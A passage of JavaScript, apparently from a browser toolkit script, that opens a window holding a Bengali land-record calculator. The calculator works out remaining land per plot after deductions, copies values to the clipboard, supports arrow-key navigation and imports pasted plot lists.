        tbody.appendChild(tr); updateSerialNumbers(); if(total !== "") calculateRow(tr.querySelector('.total-land'));
    }
    function handleDeductionEnter(e, input) { if (e.key === 'Enter') { e.preventDefault(); manualAddBox(input.closest('.deduction-wrapper').querySelector('.add-box-btn')); } }
    function manualAddBox(btn) { const input = addDeductionBox(btn); input.focus(); }
    function addDeductionBox(btn) {
        const wrapper = btn.closest('.deduction-wrapper'); const input = document.createElement('input'); input.type = 'text'; input.placeholder = 'জমি'; input.className = 'deduction-input';
        input.oninput = function() { calculateRow(this); }; input.onkeypress = function(e) { handleDeductionEnter(e, this); }; wrapper.insertBefore(input, btn); return input;
    }
    function checkAndAddExtraBox(row) {
        const inputs = row.querySelectorAll('.deduction-input'); const filledCount = Array.from(inputs).filter(i => i.value.trim() !== "").length;
        if (filledCount >= inputs.length - 1) { addDeductionBox(row.querySelector('.add-box-btn')); }
    }
    function calculateRow(el) {
        const row = el.closest('tr'); checkAndAddExtraBox(row);
        let total = parseFloat(convertToEnglish(row.querySelector('.total-land').value)) || 0; let deducted = 0;
        row.querySelectorAll('.deduction-input').forEach(i => { deducted += parseFloat(convertToEnglish(i.value)) || 0; });
        let rem = total - deducted; const remDisplay = row.querySelector('.remaining-land');
        remDisplay.innerText = toBengaliNumber(rem.toFixed(2));
        if (rem < 0) { remDisplay.style.color = "var(--danger)"; } else { remDisplay.style.color = "var(--success)"; } calculateGrandTotal();
    }
    function calculateGrandTotal() {
        let grand = 0; document.querySelectorAll('.remaining-land').forEach(el => { grand += parseFloat(convertToEnglish(el.innerText)) || 0; });
        const gtDisplay = document.getElementById('grand-total'); gtDisplay.innerText = toBengaliNumber(grand.toFixed(2));
        if (grand < 0) { gtDisplay.style.color = "var(--danger)"; } else { gtDisplay.style.color = "#1e3a8a"; }
    }
    function removeRow(btn) { btn.closest('tr').remove(); updateSerialNumbers(); calculateGrandTotal(); }
    function resetAll() { if(confirm("সব মুছবেন?")) { document.getElementById('table-body').innerHTML = ""; addRow(); calculateGrandTotal(); } }
    function showCopyFeedback(btnId, originalText) {
        const btn = document.getElementById(btnId); btn.innerText = "✓ কপি হয়েছে"; setTimeout(() => { btn.innerText = originalText; }, 1500);
    }
    function copyRemaining(btn) {
        let val = parseFloat(convertToEnglish(btn.previousElementSibling.innerText)) || 0; let copyVal = val < 0 ? 0 : val;
        navigator.clipboard.writeText(toBengaliNumber(copyVal.toFixed(2))).then(() => { btn.innerText = "✓"; setTimeout(() => btn.innerText = "কপি", 1000); });
    }
    function copyAllDags() {
        const vals = Array.from(document.querySelectorAll('.dag-input')).map(i => i.value).filter(v => v);
        navigator.clipboard.writeText(vals.join(', ')).then(() => { showCopyFeedback('btn-copy-dag', 'সব দাগ নং কপি'); });
    }
    function copyAllShreni() {
        const vals = Array.from(document.querySelectorAll('.shreni-input')).map(i => i.value).filter(v => v);
        navigator.clipboard.writeText(vals.join(', ')).then(() => { showCopyFeedback('btn-copy-shreni', 'সব শ্রেণি কপি'); });
    }
    function copyAllRemaining() {
        const vals = Array.from(document.querySelectorAll('.remaining-land')).map(el => { let val = parseFloat(convertToEnglish(el.innerText)) || 0; let finalVal = val < 0 ? 0 : val; return toBengaliNumber(finalVal.toFixed(2)); });
        navigator.clipboard.writeText(vals.join(', ')).then(() => { showCopyFeedback('btn-copy-land', 'সব অবশিষ্ট জমি কপি'); });
    }
    document.addEventListener('keydown', function(e) {
        const active = document.activeElement; if (!active || active.tagName !== 'INPUT' || !active.closest('#table-body')) return;
        const row = active.closest('tr'); const rows = Array.from(document.querySelectorAll('#table-body tr')); const rowIndex = rows.indexOf(row);
        const inputs = Array.from(row.querySelectorAll('input[type="text"]')); const colIndex = inputs.indexOf(active);
        if (e.key === 'ArrowUp' && rowIndex > 0) rows[rowIndex-1].querySelectorAll('input[type="text"]')[colIndex]?.focus();
        else if (e.key === 'ArrowDown' && rowIndex < rows.length - 1) rows[rowIndex+1].querySelectorAll('input[type="text"]')[colIndex]?.focus();
        else if (e.key === 'ArrowRight' && active.selectionStart === active.value.length) inputs[colIndex + 1]?.focus();
        else if (e.key === 'ArrowLeft' && active.selectionEnd === 0) inputs[colIndex - 1]?.focus();
    });
    function importDags() {
        let input = prompt("তালিকা পেস্ট করুন (যেমন: ৭৩৪ — বোরো — ১৬)");
        if (input) { input.split('\\n').filter(l => l.trim()).forEach(line => { let parts = line.split(/[—\\-]+/).map(s => s.trim()); addRow(parts[0] || "", parts[1] || "", parts[2] || ""); }); }
    }
    window.onload = () => { if (document.querySelectorAll('#table-body tr').length === 0) addRow(); };
<\/script>
</body>
</html>`;
                
                calcWin.document.open();
                calcWin.document.write(calcCode);
                calcWin.document.close();
            }
        };
        
        document.querySelectorAll('.vmt-tool').forEach(el => {
            el.addEventListener('click', function(e) {
                e.preventDefault();
                const t = this.getAttribute('data-tool');
                if (window._vmtTools[t]) {
                    try { 
                        window._vmtTools[t](); 
                        let toolKitDiv = document.getElementById('vumi-master-toolkit');
                        let minButton = document.getElementById('vmt-min');
                        if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                            toolKitDiv.classList.add('minimized');
                            if (minButton) minButton.innerText = '+';
                        }
                    } catch (err) { 
                        alert('Error: ' + err.message); console.error(err); 
                    }
                }
            });
        });
    }
})();
